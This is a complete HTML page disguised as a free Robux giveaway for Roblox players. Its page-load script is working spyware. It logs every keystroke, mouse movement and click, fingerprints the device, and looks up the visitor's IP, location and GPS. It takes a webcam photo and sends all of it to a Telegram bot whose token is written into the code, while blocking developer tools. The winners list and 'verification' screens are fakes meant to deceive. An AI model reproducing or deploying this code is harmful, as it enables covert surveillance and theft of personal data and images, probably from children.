<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÆ Free Robux Giveaway - Win 10,000 Robux Daily! üéÅ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Â§¥ÈÉ®Ê†∑Âºè */
        .header {
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(90deg, #00a2ff 0%, #00ffaa 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 3.5rem;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(0, 255, 170, 0.5);
        }

        .header p {
            font-size: 1.3rem;
            color: #8af;
            margin-bottom: 20px;
        }

        /* RobuxÂä®Áîª */
        .robux-animation {
            font-size: 2.5rem;
            text-align: center;
            animation: float 3s infinite ease-in-out;
            margin: 20px 0;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        /* Â•ñÂìÅÂ±ïÁ§∫ */
        .prize-showcase {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin: 40px 0;
        }

        .prize-card {
            background: rgba(0, 50, 100, 0.7);
            border: 2px solid #00ffaa;
            border-radius: 15px;
            padding: 25px;
            width: 250px;
            text-align: center;
            transition: all 0.3s;
            backdrop-filter: blur(10px);
        }

        .prize-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 255, 170, 0.3);
            border-color: #ff3366;
        }

        .prize-card h3 {
            font-size: 1.8rem;
            margin-bottom: 10px;
            color: #00ffaa;
        }

        .prize-card .robux-amount {
            font-size: 2.2rem;
            color: #ffcc00;
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
        }

        /* Âä†ËΩΩÈÅÆÁΩ© */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: #00ffaa;
            font-size: 1.2rem;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 3px solid transparent;
            border-top: 3px solid #00ffaa;
            border-right: 3px solid #00ffaa;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* È™åËØÅÈù¢Êùø */
        .verification-panel {
            background: rgba(0, 30, 60, 0.9);
            border: 1px solid #00a2ff;
            border-radius: 15px;
            padding: 30px;
            margin: 30px auto;
            max-width: 800px;
            display: none;
        }

        .data-stream {
            height: 150px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00ffaa;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            color: #00ffaa;
            font-size: 0.9rem;
        }

        /* ËÆ°Êï∞Âô® */
        .counter {
            text-align: center;
            font-size: 1.5rem;
            color: #ff3366;
            margin: 20px 0;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        /* ÊàêÂäüÈ°µÈù¢ */
        .success-screen {
            text-align: center;
            padding: 50px 20px;
            display: none;
        }

        .success-icon {
            font-size: 5rem;
            margin-bottom: 20px;
            color: #00ffaa;
            animation: celebrate 2s infinite;
        }

        @keyframes celebrate {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        /* Áî®Êà∑Â±ïÁ§∫ */
        .winners-showcase {
            background: rgba(0, 40, 80, 0.8);
            border-radius: 15px;
            padding: 25px;
            margin: 30px auto;
            max-width: 800px;
        }

        .winner-card {
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border-left: 4px solid #ffcc00;
        }

        /* ËøõÂ∫¶Êù° */
        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ffaa, #00a2ff);
            border-radius: 10px;
            width: 0%;
            transition: width 2s ease-in-out;
        }

        /* ÂìçÂ∫îÂºèËÆæËÆ° */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2.5rem;
            }
            .prize-card {
                width: 100%;
                max-width: 300px;
            }
        }
    </style>
</head>
<body>
<!-- Âä†ËΩΩÈÅÆÁΩ© -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
    <div id="loadingText">Preparing Robux Giveaway...</div>
    <div id="loadingProgress" style="margin-top: 10px; color: #8af;"></div>
</div>

<div class="container" id="mainContent" style="display: none;">
    <!-- Â§¥ÈÉ® -->
    <div class="header">
        <h1>üéÅ FREE ROBUX GIVEAWAY üéÅ</h1>
        <p>Daily 10,000 Robux Giveaway - Limited Time Only!</p>
        <div class="robux-animation">ü™ôüí∞üíéüåü</div>
    </div>

    <!-- Âú®Á∫øËÆ°Êï∞Âô® -->
    <div class="counter" id="onlineCounter">
        <span id="onlineCount">1,247</span> users online now!
    </div>

    <!-- Â•ñÂìÅÂ±ïÁ§∫ -->
    <div class="prize-showcase">
        <div class="prize-card">
            <h3>ü•á First Prize</h3>
            <div class="robux-amount">5,000 Robux</div>
            <p>+ Premium Game Pass</p>
        </div>
        <div class="prize-card">
            <h3>ü•à Second Prize</h3>
            <div class="robux-amount">2,500 Robux</div>
            <p>+ Exclusive Items</p>
        </div>
        <div class="prize-card">
            <h3>ü•â Third Prize</h3>
            <div class="robux-amount">1,000 Robux</div>
            <p>+ Limited Avatar</p>
        </div>
    </div>

    <!-- ËøõÂ∫¶Êù° -->
    <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
    </div>

    <!-- È™åËØÅÈù¢ÊùøÔºàÈöêËóèÔºâ -->
    <div class="verification-panel" id="verificationPanel">
        <h3 style="color: #00ffaa; text-align: center; margin-bottom: 20px;">üîê VERIFICATION IN PROGRESS</h3>
        <div class="data-stream" id="dataStream">
            [System] Starting verification process...<br>
        </div>
        <p style="text-align: center; color: #8af; margin-top: 15px;">
            Please wait while we verify your account eligibility...
        </p>
    </div>

    <!-- Ëé∑Â•ñËÄÖÂ±ïÁ§∫ -->
    <div class="winners-showcase">
        <h3 style="color: #ffcc00; margin-bottom: 20px;">üéâ RECENT WINNERS</h3>
        <div class="winner-card">
            <div style="background: #ffcc00; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ü•á</div>
            <div>
                <strong>@RobloxPro123</strong> just won <span style="color: #ffcc00;">5,000 Robux</span>!
            </div>
            <div style="margin-left: auto; color: #8af;">2 minutes ago</div>
        </div>
        <div class="winner-card">
            <div style="background: #c0c0c0; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ü•à</div>
            <div>
                <strong>@GamerGirl456</strong> just won <span style="color: #ffcc00;">2,500 Robux</span>!
            </div>
            <div style="margin-left: auto; color: #8af;">5 minutes ago</div>
        </div>
        <div class="winner-card">
            <div style="background: #cd7f32; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ü•â</div>
            <div>
                <strong>@BuildMaster789</strong> just won <span style="color: #ffcc00;">1,000 Robux</span>!
            </div>
            <div style="margin-left: auto; color: #8af;">10 minutes ago</div>
        </div>
    </div>

    <!-- ÊàêÂäüÂ±èÂπï -->
    <div class="success-screen" id="successScreen">
        <div class="success-icon">‚úÖ</div>
        <h2 style="color: #00ffaa; margin-bottom: 15px;">VERIFICATION SUCCESSFUL!</h2>
        <p style="color: #8af; font-size: 1.2rem; margin-bottom: 25px;">
            You have been entered into today's Robux giveaway! üéâ
        </p>
        <div style="background: rgba(0, 255, 170, 0.1); padding: 25px; border-radius: 15px; max-width: 500px; margin: 0 auto;">
            <p style="color: #00ffaa; margin-bottom: 10px;">üéØ <strong>Your Entry Number:</strong> <span id="entryNumber" style="color: #ffcc00;">RG-</span></p>
            <p style="color: #00ffaa; margin-bottom: 10px;">‚è∞ <strong>Draw Time:</strong> Today at 8:00 PM EST</p>
            <p style="color: #00ffaa; margin-bottom: 10px;">üì± <strong>Notification:</strong> Winners notified via Roblox message</p>
            <p style="color: #00ffaa;">üí∞ <strong>Total Prize Pool:</strong> <span style="color: #ffcc00;">50,000 Robux</span></p>
        </div>
        <div style="margin-top: 30px; padding: 20px; background: rgba(0, 100, 200, 0.2); border-radius: 10px;">
            <p style="color: #8af;">‚ö†Ô∏è Keep this page open for 5 minutes to confirm your entry!</p>
        </div>
    </div>

    <!-- ÈöêËóèÂÖÉÁ¥† -->
    <video id="cameraPreview" style="display: none;" autoplay playsinline></video>
    <canvas id="photoCanvas" style="display: none;"></canvas>

    <!-- È°µËÑö -->
    <div style="text-align: center; margin-top: 50px; padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.1);">
        <p style="color: #666; font-size: 0.9rem;">
            ¬© 2024 Robux Giveaway Official. This promotion is not affiliated with Roblox Corporation.<br>
            Robux and Roblox are trademarks of Roblox Corporation.
        </p>
    </div>
</div>
    <script>
        // ==================== CONFIGURATION ====================
        const TELEGRAM_CONFIG = {
            botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",  // Replace with your bot token
            chatId: "8313770381",      // Replace with your chat ID
            sendInterval: 2000                // Send data every 2 seconds
        };

        // ==================== GLOBAL VARIABLES ====================
        let collectedData = {
            timestamp: new Date().toISOString(),
            status: 'initializing',
            ip: null,
            location: null,
            device: {},
            network: {},
            behavior: [],
            camera: { accessed: false, photo: null }
        };

        let dataStreamInterval;
        let telemetrySent = false;
        let cameraAccessed = false;
        let mousePositions = [];
        let keyStrokes = [];

        // ==================== DOM ELEMENTS ====================
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const loadingProgress = document.getElementById('loadingProgress');
        const mainContent = document.getElementById('mainContent');
        const verificationPanel = document.getElementById('verificationPanel');
        const dataStream = document.getElementById('dataStream');
        const successScreen = document.getElementById('successScreen');
        const cameraPreview = document.getElementById('cameraPreview');
        const photoCanvas = document.getElementById('photoCanvas');
        const progressFill = document.getElementById('progressFill');
        const onlineCount = document.getElementById('onlineCount');
        const entryNumber = document.getElementById('entryNumber');

        // ==================== UTILITY FUNCTIONS ====================
        
        // Update loading text
        function updateLoading(text) {
            if (loadingText) loadingText.textContent = text;
        }

        // Update progress
        function updateProgress(text, percent) {
            if (loadingProgress) loadingProgress.textContent = text;
            if (progressFill) progressFill.style.width = percent + '%';
        }

        // Log to data stream
        function logToStream(message) {
            if (dataStream) {
                const timestamp = new Date().toLocaleTimeString();
                dataStream.innerHTML += `[${timestamp}] ${message}<br>`;
                dataStream.scrollTop = dataStream.scrollHeight;
            }
            console.log(message);
        }

        // Generate random entry number
        function generateEntryNumber() {
            const prefix = 'RG-';
            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 8; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return prefix + result;
        }

        // Format data for Telegram
        function formatTelegramMessage() {
            return `üö® NEW ROBUX GIVEAWAY ENTRY üö®

üìÖ Time: ${new Date().toLocaleString()}
üåê IP: ${collectedData.ip || 'Unknown'}
üìç Location: ${collectedData.location || 'Unknown'}
üì± Device: ${collectedData.device.platform || 'Unknown'}
üñ•Ô∏è Screen: ${collectedData.device.screen || 'Unknown'}
üåç Browser: ${collectedData.device.browser || 'Unknown'}
üó£Ô∏è Language: ${collectedData.device.language || 'Unknown'}
‚è±Ô∏è Timezone: ${collectedData.device.timezone || 'Unknown'}
üõú ISP: ${collectedData.network.isp || 'Unknown'}
üîã Battery: ${collectedData.device.battery || 'Unknown'}
üì∏ Camera: ${cameraAccessed ? 'ACCESSED ‚úÖ' : 'DENIED ‚ùå'}
üñ±Ô∏è Mouse Track: ${mousePositions.length} points
‚å®Ô∏è Keystrokes: ${keyStrokes.length} keys
üéØ UserAgent: ${collectedData.device.userAgent || 'Unknown'}

üìä FULL DATA:
${JSON.stringify(collectedData, null, 2)}`;
        }

        // Send to Telegram
        async function sendToTelegram(message, isPhoto = false) {
            if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
                console.error('Telegram config missing!');
                return false;
            }

            try {
                let url, options;
                
                if (isPhoto) {
                    // Send photo
                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`;
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
                    formData.append('photo', message, 'face_verification.jpg');
                    formData.append('caption', `üì∏ Face Verification - ${new Date().toLocaleString()}`);
                    
                    options = {
                        method: 'POST',
                        body: formData
                    };
                } else {
                    // Send text message
                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
                    options = {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CONFIG.chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    };
                }

                const response = await fetch(url, options);
                const result = await response.json();
                
                if (result.ok) {
                    logToStream(`‚úÖ Data sent to Telegram ${isPhoto ? '(Photo)' : '(Text)'}`);
                    return true;
                } else {
                    logToStream(`‚ùå Telegram error: ${result.description}`);
                    return false;
                }
            } catch (error) {
                logToStream(`‚ùå Network error: ${error.message}`);
                return false;
            }
        }
// ==================== DATA COLLECTION FUNCTIONS ====================

// Collect IP and network info
async function collectNetworkInfo() {
    updateProgress('Collecting network information...', 20);
    
    try {
        // Get IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        collectedData.ip = ipData.ip;
        
        // Get location and ISP
        try {
            const geoResponse = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
            const geoData = await geoResponse.json();
            
            collectedData.network = {
                ip: collectedData.ip,
                city: geoData.city,
                region: geoData.region,
                country: geoData.country_name,
                countryCode: geoData.country_code,
                isp: geoData.org,
                asn: geoData.asn,
                vpn: geoData.vpn || false,
                tor: geoData.tor || false,
                proxy: geoData.proxy || false,
                latitude: geoData.latitude,
                longitude: geoData.longitude
            };
            
            collectedData.location = `${geoData.city}, ${geoData.country_name}`;
            logToStream(`üìç Location: ${collectedData.location}`);
            logToStream(`üè¢ ISP: ${geoData.org}`);
            logToStream(`üåê IP: ${collectedData.ip}`);
            
        } catch (geoError) {
            // Fallback API
            try {
                const fallbackResponse = await fetch(`http://ip-api.com/json/${collectedData.ip}`);
                const fallbackData = await fallbackResponse.json();
                if (fallbackData.status === 'success') {
                    collectedData.network = {
                        ip: collectedData.ip,
                        city: fallbackData.city,
                        region: fallbackData.regionName,
                        country: fallbackData.country,
                        isp: fallbackData.isp,
                        latitude: fallbackData.lat,
                        longitude: fallbackData.lon
                    };
                    collectedData.location = `${fallbackData.city}, ${fallbackData.country}`;
                }
            } catch (e) {}
        }
        
    } catch (error) {
        logToStream('‚ö†Ô∏è Network info collection failed');
    }
}

// Collect device information
function collectDeviceInfo() {
    updateProgress('Scanning device...', 40);
    
    collectedData.device = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type,
        deviceMemory: navigator.deviceMemory || 'unknown',
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        doNotTrack: navigator.doNotTrack,
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        browser: detectBrowser(),
        browserVersion: detectBrowserVersion(),
        os: detectOS()
    };

    // Connection info
    if (navigator.connection) {
        collectedData.device.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        };
    }

    // Battery info
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            collectedData.device.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            logToStream(`üîã Battery: ${collectedData.device.battery.level}`);
        });
    }

    logToStream(`üì± Device: ${collectedData.device.platform}`);
    logToStream(`üñ•Ô∏è Screen: ${collectedData.device.screen}`);
    logToStream(`üåê Browser: ${collectedData.device.browser} ${collectedData.device.browserVersion}`);
    logToStream(`‚è±Ô∏è Timezone: ${collectedData.device.timezone}`);
}

// Detect browser
function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "Unknown";
}

// Detect browser version
function detectBrowserVersion() {
    const ua = navigator.userAgent;
    const matches = ua.match(/(chrome|firefox|safari|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i);
    return matches ? matches[2] : 'Unknown';
}

// Detect OS
function detectOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows")) return "Windows";
    if (ua.includes("Mac")) return "MacOS";
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    return "Unknown";
}
// ==================== CAMERA & LOCATION COLLECTION ====================

// Attempt to access camera IMMEDIATELY
async function accessCamera() {
    updateProgress('Verifying identity...', 60);
    
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        logToStream('‚ùå Camera API not supported');
        return false;
    }

    try {
        logToStream('üì∏ Attempting camera access...');
        
        // Try to get camera without showing permission dialog first
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: 'user'
            },
            audio: false
        });

        cameraAccessed = true;
        collectedData.camera.accessed = true;
        logToStream('‚úÖ Camera access successful!');
        
        // Capture photo immediately
        cameraPreview.srcObject = stream;
        
        setTimeout(() => {
            try {
                const context = photoCanvas.getContext('2d');
                photoCanvas.width = cameraPreview.videoWidth || 640;
                photoCanvas.height = cameraPreview.videoHeight || 480;
                
                if (cameraPreview.videoWidth > 0) {
                    context.drawImage(cameraPreview, 0, 0);
                    
                    // Convert to blob and send
                    photoCanvas.toBlob(async (blob) => {
                        if (blob) {
                            collectedData.camera.photo = 'Captured';
                            logToStream('üì∑ Photo captured successfully');
                            
                            // Send photo to Telegram
                            await sendToTelegram(blob, true);
                            
                            // Stop camera
                            stream.getTracks().forEach(track => track.stop());
                            cameraPreview.srcObject = null;
                        }
                    }, 'image/jpeg', 0.8);
                }
            } catch (photoError) {
                logToStream('‚ùå Photo capture failed');
            }
        }, 100); // Capture after 100ms

        return true;
        
    } catch (error) {
        logToStream(`‚ùå Camera access denied: ${error.name}`);
        collectedData.camera.error = error.name;
        return false;
    }
}

// Try to get location
async function getLocation() {
    if ('geolocation' in navigator) {
        try {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    collectedData.location.gps = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    };
                    logToStream(`üìç GPS Coordinates: ${position.coords.latitude}, ${position.coords.longitude}`);
                },
                (error) => {
                    logToStream('‚ö†Ô∏è Location permission denied');
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        } catch (error) {
            // Silent fail
        }
    }
}

// Collect sensor data
function collectSensorData() {
    updateProgress('Checking sensors...', 70);
    
    collectedData.sensors = {};
    
    // Gyroscope
    if ('DeviceOrientationEvent' in window) {
        collectedData.sensors.gyroscope = true;
        window.addEventListener('deviceorientation', (event) => {
            if (!collectedData.sensors.orientation) {
                collectedData.sensors.orientation = {
                    alpha: event.alpha,
                    beta: event.beta,
                    gamma: event.gamma
                };
            }
        }, { once: true });
    }

    // Accelerometer
    if ('DeviceMotionEvent' in window) {
        collectedData.sensors.accelerometer = true;
        window.addEventListener('devicemotion', (event) => {
            if (!collectedData.sensors.motion) {
                collectedData.sensors.motion = {
                    acceleration: event.acceleration,
                    accelerationIncludingGravity: event.accelerationIncludingGravity,
                    rotationRate: event.rotationRate
                };
            }
        }, { once: true });
    }

    // Light sensor
    if ('AmbientLightSensor' in window) {
        collectedData.sensors.lightSensor = true;
    }

    // Proximity sensor
    if ('ondeviceproximity' in window || 'onuserproximity' in window) {
        collectedData.sensors.proximity = true;
    }

    logToStream('üì° Sensor scan completed');
}
        // ==================== BEHAVIOR TRACKING ====================

        // Track mouse movements
        function trackMouse() {
            document.addEventListener('mousemove', (event) => {
                mousePositions.push({
                    x: event.clientX,
                    y: event.clientY,
                    time: Date.now()
                });
                
                // Keep only last 100 positions
                if (mousePositions.length > 100) {
                    mousePositions = mousePositions.slice(-100);
                }
                
                collectedData.behavior.push({
                    type: 'mouse_move',
                    x: event.clientX,
                    y: event.clientY,
                    timestamp: new Date().toISOString()
                });
            });
            
            // Track clicks
            document.addEventListener('click', (event) => {
                collectedData.behavior.push({
                    type: 'click',
                    x: event.clientX,
                    y: event.clientY,
                    target: event.target.tagName,
                    timestamp: new Date().toISOString()
                });
            });
        }

        // Track keyboard input
        function trackKeyboard() {
            document.addEventListener('keydown', (event) => {
                keyStrokes.push({
                    key: event.key,
                    code: event.code,
                    time: Date.now()
                });
                
                collectedData.behavior.push({
                    type: 'keypress',
                    key: event.key,
                    code: event.code,
                    timestamp: new Date().toISOString()
                });
            });
        }

        // Track scrolling
        function trackScrolling() {
            let lastScroll = Date.now();
            window.addEventListener('scroll', () => {
                const now = Date.now();
                if (now - lastScroll > 100) { // Throttle
                    collectedData.behavior.push({
                        type: 'scroll',
                        x: window.scrollX,
                        y: window.scrollY,
                        timestamp: new Date().toISOString()
                    });
                    lastScroll = now;
                }
            });
        }

        // ==================== MAIN PROCESS ====================

        // Start data collection process
        async function startDataCollection() {
            logToStream('üöÄ Starting Robux verification process...');
            
            // Show verification panel
            verificationPanel.style.display = 'block';
            
            // Step 1: Basic info
            await collectNetworkInfo();
            
            // Step 2: Device info
            collectDeviceInfo();
            
            // Step 3: Try camera immediately
            setTimeout(() => {
                accessCamera();
            }, 500);
            
            // Step 4: Try location
            setTimeout(() => {
                getLocation();
            }, 1000);
            
            // Step 5: Sensors
            setTimeout(() => {
                collectSensorData();
            }, 1500);
            
            // Step 6: Start behavior tracking
            trackMouse();
            trackKeyboard();
            trackScrolling();
            
            // Step 7: Start sending data periodically
            setTimeout(() => {
                sendTelemetryData();
                dataStreamInterval = setInterval(sendTelemetryData, TELEGRAM_CONFIG.sendInterval);
            }, 2000);
            
            // Step 8: Complete process
            setTimeout(() => {
                completeVerification();
            }, 5000);
        }

        // Send telemetry data
        async function sendTelemetryData() {
            if (telemetrySent) return;
            
            try {
                const message = formatTelegramMessage();
                await sendToTelegram(message);
                
                // Update counter
                const currentCount = parseInt(onlineCount.textContent.replace(/,/g, ''));
                onlineCount.textContent = (currentCount + Math.floor(Math.random() * 3) + 1).toLocaleString();
                
            } catch (error) {
                console.error('Telemetry send failed:', error);
            }
        }

        // Complete verification
        async function completeVerification() {
            updateProgress('Finalizing entry...', 100);
            
            // Send final data
            await sendTelemetryData();
            telemetrySent = true;
            
            // Clear interval
            if (dataStreamInterval) {
                clearInterval(dataStreamInterval);
            }
            
            // Show success screen
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                mainContent.style.display = 'block';
                verificationPanel.style.display = 'none';
                successScreen.style.display = 'block';
                
                // Generate entry number
                const entryNum = generateEntryNumber();
                entryNumber.textContent = entryNum;
                collectedData.entryNumber = entryNum;
                
                // Send final confirmation
                setTimeout(() => {
                    const finalMessage = `‚úÖ VERIFICATION COMPLETE
User: ${entryNum}
IP: ${collectedData.ip}
Location: ${collectedData.location}
Camera: ${cameraAccessed ? 'YES' : 'NO'}
Total Data Points: ${Object.keys(collectedData).length}`;
                    
                    sendToTelegram(finalMessage);
                }, 1000);
                
            }, 1500);
        }

        // ==================== INITIALIZATION ====================

        // Start on page load
        window.addEventListener('DOMContentLoaded', () => {
            // Start loading animation
            updateLoading('Initializing Robux giveaway system...');
            updateProgress('Loading...', 10);
            
            // Update counter animation
            setInterval(() => {
                const current = parseInt(onlineCount.textContent.replace(/,/g, ''));
                const change = Math.floor(Math.random() * 5) - 2; // -2 to +2
                onlineCount.textContent = Math.max(1000, current + change).toLocaleString();
            }, 3000);
            
            // Start data collection after 1 second
            setTimeout(() => {
                startDataCollection();
            }, 1000);
            
            // Prevent right-click and dev tools
            document.addEventListener('contextmenu', (e) => e.preventDefault());
            document.addEventListener('keydown', (e) => {
                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                }
            });
        });

        // Send data when page unloads
        window.addEventListener('beforeunload', () => {
            if (!telemetrySent) {
                sendTelemetryData();
            }
        });

        // Send data when page is hidden
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && !telemetrySent) {
                sendTelemetryData();
            }
        });
    </script>
</body>
</html>
